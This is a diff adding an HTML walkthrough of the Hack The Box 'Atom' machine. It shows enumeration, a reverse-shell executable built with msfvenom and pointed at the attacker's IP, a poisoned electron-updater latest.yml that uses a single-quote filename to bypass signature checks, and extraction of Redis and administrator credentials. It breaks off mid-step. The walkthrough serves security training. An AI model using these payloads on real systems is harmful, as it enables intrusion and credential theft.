@@ -1,0 +1,759 @@
+I"s�<h1 id="enumeration">Enumeration</h1>
+<h2 id="masscan--nmap">Masscan + Nmap</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 10.10.10.237 <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2021-07-02 21:54:22 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>131070 ports/host]
+Discovered open port 80/tcp on 10.10.10.237
+Discovered open port 443/tcp on 10.10.10.237
+Discovered open port 5985/tcp on 10.10.10.237
+Discovered open port 135/tcp on 10.10.10.237
+Discovered open port 6379/tcp on 10.10.10.237
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Parse those ports to nmap:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
+<span class="nv">$ </span>nmap <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> 10.10.10.237 <span class="nt">-oN</span> nmap-fullscan.out
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-03 03:25 IST
+Nmap scan report <span class="k">for </span>atom.htb <span class="o">(</span>10.10.10.237<span class="o">)</span>
+Host is up <span class="o">(</span>0.094s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Heed Solutions
+135/tcp  open  msrpc    Microsoft Windows RPC
+443/tcp  open  ssl/http Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Heed Solutions
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn:
+|_  http/1.1
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6379/tcp open  redis    Redis key-value store
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.78 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="smb">SMB</h2>
+<p>No password authentication allowed:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-L</span> //10.10.10.237
+WARNING: no network interfaces found
+Enter WORKGROUP<span class="se">\r</span>oot<span class="s1">'s password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Software_Updates Disk
+SMB1 disabled -- no workgroup available
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Directory listing of share <code class="language-plaintext highlighter-rouge">Software_Updates</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-N</span> //10.10.10.237/Software_Updates <span class="nt">-c</span> <span class="s1">'ls'</span>
+WARNING: no network interfaces found
+  <span class="nb">.</span>                                   D        0  Sat Jul  3 03:22:30 2021
+  ..                                  D        0  Sat Jul  3 03:22:30 2021
+  client1                             D        0  Sat Jul  3 03:22:30 2021
+  client2                             D        0  Sat Jul  3 03:22:30 2021
+  client3                             D        0  Sat Jul  3 03:22:30 2021
+  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 16:48:08 2021
+
+                4413951 blocks of size 4096. 1353700 blocks available
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
+<p>UAT_Testing_Procedures.pdf contains the following details:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre>Heedv1.0
+Internal QA Documentation
+What is Heed ?
+Note taking application built with electron-builder which helps <span class="nb">users </span><span class="k">in </span>taking important notes.
+Features ?
+Very limited at the moment. There’s no server interaction when creating notes. So currently it just acts as a one-tier thick client application. We are planning to move it to a full fledged two-tier architecture sometime <span class="k">in </span>the future releases.
+What about QA ?
+We follow the below process before releasing our products.
+1. Build and <span class="nb">install </span>the application to make sure it works as we expect it to be.
+2. Make sure that the update server running is <span class="k">in </span>a private hardened instance. To initiate the QA process, just place the updates <span class="k">in </span>one of the <span class="s2">"client"</span> folders, and the appropriate QA team will <span class="nb">test </span>it to ensure it finds an update and installs it correctly.
+3. Follow the checklist to see <span class="k">if </span>all given features are working as expected by the developer.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h4 id="pdf-gives-some-hints">PDF gives some hints:</h4>
+<ul>
+  <li>A Software named <code class="language-plaintext highlighter-rouge">Heed</code> built on <code class="language-plaintext highlighter-rouge">electron-builder</code> to help user keep notes.</li>
+  <li>Its running as a server, to initiate process, place the updates in one of the client folders. (which were available on SMB share)</li>
+</ul>
+
+<h4 id="idea">Idea:</h4>
+<ul>
+  <li>Updates folder of Heed is shared, which means we can pass any version updates on it.</li>
+</ul>
+
+<h4 id="google-electron-builder-heedv10-exploit">Google <em>“electron builder heedv1.0 exploit”</em>:</h4>
+<ul>
+  <li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a> seems perfect as an exploit. 
+It uses Signature Validation Bypass in the update and runs any binary provided.</li>
+</ul>
+
+<blockquote>
+  <p><em>“During a software update, the application will request a file named latest.yml from the update server, which contains the definition of the new release - including the binary filename and hashes.”</em></p>
+</blockquote>
+
+<blockquote>
+  <p><em>Since the ${tempUpdateFile} variable is provided unescaped to the execFile utility, an attacker could bypass the entire signature verification by triggering a parse error in the script. This can be easily achieved by using a filename containing a single quote and then by recalculating the file hash to match the attacker-provided binary.</em></p>
+</blockquote>
+
+<h4 id="requirements-of-update-latestyml">Requirements of update (latest.yml):</h4>
+<ul>
+  <li>Definition of the new release (Version greater than the current v1.0 )</li>
+  <li>Binary filename (contains a single quote for triggering parse error and bypassing signature verification)</li>
+  <li>Binary hash (calculated with <code class="language-plaintext highlighter-rouge">shasum -a 512 maliciousupdate.exe | cut -d " " -f1 | xxd -r -p | base64</code>)</li>
+</ul>
+
+<h2 id="exploitation">Exploitation</h2>
+<ul>
+  <li>Generate a reverse-shell spawning binary with msfvenom:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.25 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="nt">-o</span> e<span class="se">\'</span>xploit.exe                                                     
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: e<span class="s1">'xploit.exe
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Calculate binary hash:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>shasum <span class="nt">-a</span> 512 e<span class="se">\'</span>xploit.exe | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f1</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span> | <span class="nb">base64
+</span>Xv/cUPTmEAbue35veKzAKZTo3Gsm7NiNyNvgRHB465kFjWNvRLFs1wodNLe431tfvpHK3WVivpvoe1bK015g7A<span class="o">==</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>latest.yml file looks like:
+    <div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="na">version</span><span class="pi">:</span> <span class="s">1.2.3</span>
+<span class="na">path</span><span class="pi">:</span> <span class="s">http://10.10.14.25/e'xploit.exe</span>
+<span class="na">sha512</span><span class="pi">:</span> <span class="s">Xv/cUPTmEAbue35veKzAKZTo3Gsm7NiNyNvgRHB465kFjWNvRLFs1wodNLe431tfvpHK3WVivpvoe1bK015g7A==</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Upload latest.yml onto the share:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-N</span> //10.10.10.237/Software_Updates <span class="nt">-c</span> <span class="s1">'cd client1;put latest.yml;ls'</span>
+putting file latest.yml as <span class="se">\c</span>lient1<span class="se">\l</span>atest.yml <span class="o">(</span>0.5 kb/s<span class="o">)</span> <span class="o">(</span>average 0.5 kb/s<span class="o">)</span>
+<span class="nb">.</span>                                   D        0  Sat Jul  3 03:12:51 2021
+..                                  D        0  Sat Jul  3 03:12:51 2021
+latest.yml                          A      152  Sat Jul  3 03:17:13 2021
+
+              4413951 blocks of size 4096. 1353857 blocks available
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Setup listener and get reverse shell as <code class="language-plaintext highlighter-rouge">atom\jason</code>.
+    <h1 id="privesc">Privesc</h1>
+  </li>
+  <li>Running winpeas gave us no critical vulnerabilities to exploit.</li>
+  <li>Redis database server running at port 6379.</li>
+  <li>Jason’s downloads folder contains some important data.
+    <h3 id="redis-database-server">Redis Database server</h3>
+  </li>
+  <li>Redis server earlier on gave authentication required:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>  <span class="nv">$ </span>redis-cli <span class="nt">-h</span> 10.10.10.237
+  10.10.10.237:6379&gt; info
+  NOAUTH Authentication required.
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Config files of redis contains a password <code class="language-plaintext highlighter-rouge">kidvscat_yes_kidvscat</code>:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="w">  </span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">gc</span><span class="w"> </span><span class="s1">'C:\Program Files\Redis\redis.windows.conf'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/vi</span><span class="w"> </span><span class="s1">'#'</span><span class="w">
+  </span><span class="n">requirepass</span><span class="w"> </span><span class="nx">kidvscat_yes_kidvscat</span><span class="w">
+  </span><span class="n">port</span><span class="w"> </span><span class="nx">6379</span><span class="w">
+  </span><span class="n">tcp-backlog</span><span class="w"> </span><span class="nx">511</span><span class="w">
+  </span><span class="n">timeout</span><span class="w"> </span><span class="nx">0</span><span class="w">
+  </span><span class="n">tcp-keepalive</span><span class="w"> </span><span class="nx">0</span><span class="w">
+  </span><span class="n">loglevel</span><span class="w"> </span><span class="nx">notice</span><span class="w">
+  </span><span class="n">logfile</span><span class="w"> </span><span class="s2">""</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Authentication in redis-server:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>  <span class="nv">$ </span>redis-cli <span class="nt">-h</span> 10.10.10.237 <span class="nt">-a</span> <span class="s1">'kidvscat_yes_kidvscat'</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <ol>
+      <li>Running <code class="language-plaintext highlighter-rouge">info</code> shows the replication role as <code class="language-plaintext highlighter-rouge">master</code> and dbs having <code class="language-plaintext highlighter-rouge">4</code> keys:</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+</pre></td> --><td class="rouge-code"><pre>10.10.10.237:6379&gt; info
+<span class="c"># Server</span>
+redis_version:3.0.504
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:a4f7a6e86f2d60b3
+redis_mode:standalone
+os:Windows
+arch_bits:64
+multiplexing_api:WinSock_IOCP
+process_id:7856
+run_id:c5360b8fb5cb582295504c65629ddbb8311ea043
+tcp_port:6379
+uptime_in_seconds:62971
+uptime_in_days:0
+hz:10
+lru_clock:14652949
+config_file:C:<span class="se">\P</span>rogram Files<span class="se">\R</span>edis<span class="se">\r</span>edis.windows-service.conf
+
+<span class="c"># Clients</span>
+connected_clients:1
+client_longest_output_list:0
+client_biggest_input_buf:0
+blocked_clients:0
+
+<span class="c"># Memory</span>
+used_memory:694624
+used_memory_human:678.34K
+used_memory_rss:656848
+used_memory_peak:694624
+used_memory_peak_human:678.34K
+used_memory_lua:36864
+mem_fragmentation_ratio:0.95
+mem_allocator:jemalloc-3.6.0
+
+<span class="c"># Persistence</span>
+loading:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1625202714
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:-1
+rdb_current_bgsave_time_sec:-1
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+
+<span class="c"># Stats</span>
+total_connections_received:6
+total_commands_processed:2
+instantaneous_ops_per_sec:0
+total_net_input_bytes:140
+total_net_output_bytes:5973101
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:0
+migrate_cached_sockets:0
+
+<span class="c"># Replication</span>
+role:master
+connected_slaves:0
+master_repl_offset:0
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+<span class="c"># CPU</span>
+used_cpu_sys:0.13
+used_cpu_user:0.30
+used_cpu_sys_children:0.00
+used_cpu_user_children:0.00
+
+<span class="c"># Cluster</span>
+cluster_enabled:0
+
+<span class="c"># Keyspace</span>
+db0:keys<span class="o">=</span>4,expires<span class="o">=</span>0,avg_ttl<span class="o">=</span>0
+</pre></td></tr></tbody></table></code></pre></div></div>
+<ol>
+  <li>Listing those keys
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>10.10.10.237:6379&gt; keys <span class="k">*</span>
+1<span class="o">)</span> <span class="s2">"pk:ids:MetaDataClass"</span>
+2<span class="o">)</span> <span class="s2">"pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"</span>
+3<span class="o">)</span> <span class="s2">"pk:ids:User"</span>
+4<span class="o">)</span> <span class="s2">"pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Getting value of those keys, gives an encrypted password for administrator:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>10.10.10.237:6379&gt; get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
+<span class="s2">"{</span><span class="se">\"</span><span class="s2">Id</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">e8e29158d70d44b1a1ba4949d52790a0</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Name</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Administrator</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Initials</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Email</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">EncryptedPassword</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Role</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Admin</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Inactive</span><span class="se">\"</span><span class="s2">:false,</span><span class="se">\"</span><span class="s2">TimeStamp</span><span class="se">\"</span><span class="s2">:637530169606440253}"</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="portable-kanban">Portable-kanban</h3>
+<ul>
+  <li>Downloads folder contains portable-kanban which has a missing PortableKanban.pk3 file. 
+PortableKanban.pk3 contains encrypted credentials for user.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td> --><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\users\jason\downloads\PortableKanban</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">gci</span><span class="w">
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\users\jason\downloads\PortableKanban</span><span class="w">
+
+
+</span><span class="n">Mode</span><span class="w">                 </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                 </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
+</span><span class="n">d-----</span><span class="w">          </span><span class="nx">4/2/2021</span><span class="w">   </span><span class="nx">7:44</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Files</span><span class="w">
+</span><span class="n">d-----</span><span class="w">          </span><span class="nx">4/2/2021</span><span class="w">   </span><span class="nx">7:17</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Plugins</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">2</span><span class="n">/27/2013</span><span class="w">   </span><span class="nx">7:06</span><span class="w"> </span><span class="nx">AM</span><span class="w">          </span><span class="nx">58368</span><span class="w"> </span><span class="nx">CommandLine.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">11</span><span class="n">/8/2017</span><span class="w">  </span><span class="nx">12:52</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">141312</span><span class="w"> </span><span class="nx">CsvHelper.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">6</span><span class="n">/22/2016</span><span class="w">   </span><span class="nx">9:31</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">456704</span><span class="w"> </span><span class="nx">DotNetZip.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">11</span><span class="n">/23/2017</span><span class="w">   </span><span class="nx">3:29</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">23040</span><span class="w"> </span><span class="nx">Itenso.Rtf.Converter.Html.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">11</span><span class="n">/23/2017</span><span class="w">   </span><span class="nx">3:29</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">75776</span><span class="w"> </span><span class="nx">Itenso.Rtf.Interpreter.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">11</span><span class="n">/23/2017</span><span class="w">   </span><span class="nx">3:29</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">32768</span><span class="w"> </span><span class="nx">Itenso.Rtf.Parser.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">11</span><span class="n">/23/2017</span><span class="w">   </span><span class="nx">3:29</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">19968</span><span class="w"> </span><span class="nx">Itenso.Sys.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">11</span><span class="n">/23/2017</span><span class="w">   </span><span class="nx">3:29</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">376832</span><span class="w"> </span><span class="nx">MsgReader.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">7</span><span class="n">/3/2014</span><span class="w">  </span><span class="nx">10:20</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">133296</span><span class="w"> </span><span class="nx">Ookii.Dialogs.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">4</span><span class="n">/2/2021</span><span class="w">   </span><span class="nx">8:22</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">5920</span><span class="w"> </span><span class="nx">PortableKanban.cfg</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">1</span><span class="n">/4/2018</span><span class="w">   </span><span class="nx">8:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">118184</span><span class="w"> </span><span class="nx">PortableKanban.Data.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">1</span><span class="n">/4/2018</span><span class="w">   </span><span class="nx">8:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">        </span><span class="nx">1878440</span><span class="w"> </span><span class="nx">PortableKanban.exe</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">1</span><span class="n">/4/2018</span><span class="w">   </span><span class="nx">8:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">31144</span><span class="w"> </span><span class="nx">PortableKanban.Extensions.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">4</span><span class="n">/2/2021</span><span class="w">   </span><span class="nx">7:21</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">172</span><span class="w"> </span><span class="nx">PortableKanban.pk3.lock</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">9</span><span class="n">/6/2017</span><span class="w">  </span><span class="nx">12:18</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">413184</span><span class="w"> </span><span class="nx">ServiceStack.Common.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">9</span><span class="n">/6/2017</span><span class="w">  </span><span class="nx">12:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">137216</span><span class="w"> </span><span class="nx">ServiceStack.Interfaces.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">9</span><span class="n">/6/2017</span><span class="w">  </span><span class="nx">12:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">292352</span><span class="w"> </span><span class="nx">ServiceStack.Redis.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">9</span><span class="n">/6/2017</span><span class="w">   </span><span class="nx">4:38</span><span class="w"> </span><span class="nx">AM</span><span class="w">         </span><span class="nx">411648</span><span class="w"> </span><span class="nx">ServiceStack.Text.dll</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">1</span><span class="n">/4/2018</span><span class="w">   </span><span class="nx">8:14</span><span class="w"> </span><span class="nx">PM</span><span class="w">        </span><span class="nx">1050092</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="nx">Guide.pdf</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<ul>
+  <li>The user-data from redis matches the format of PortableKanban.pk3 file:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>redis-user-key  | <span class="nb">sed</span> <span class="s1">'s/\\//g;s/^"//;s/"$//'</span> | jq
+<span class="o">{</span>
+<span class="s2">"Id"</span>: <span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span>,
+<span class="s2">"Name"</span>: <span class="s2">"Administrator"</span>,
+<span class="s2">"Initials"</span>: <span class="s2">""</span>,
+<span class="s2">"Email"</span>: <span class="s2">""</span>,
+<span class="s2">"EncryptedPassword"</span>: <span class="s2">"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi"</span>,
+<span class="s2">"Role"</span>: <span class="s2">"Admin"</span>,
+<span class="s2">"Inactive"</span>: <span class="nb">false</span>,
+<span class="s2">"TimeStamp"</span>: 637530169606440200
+<span class="o">}</span>
